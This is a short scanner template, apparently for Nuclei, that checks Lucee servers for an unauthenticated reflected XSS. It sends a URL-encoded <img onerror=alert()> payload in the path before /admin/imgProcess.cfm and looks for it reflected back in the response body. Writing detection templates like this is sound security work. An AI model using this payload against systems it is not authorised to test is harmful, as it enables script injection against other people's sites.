id: lucee-xss
info:
  author: incogbyte
  description: A vulnerability in Lucee allows remote attackers to inject arbitrary
    Javascript into the responses returned by the server.
  name: Lucee Unauthenticated Reflected XSS
  severity: medium
  tags: lucee,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src=a onerror=alert('{{randstr}}')>
    - MissingIncludeException
    - lucee-err
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert(''{{randstr}}'')%3elujb7/admin/imgProcess.cfm'
  - '{{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert(''{{randstr}}'')%3elujb7/admin/imgProcess.cfm'
  stop-at-first-match: true
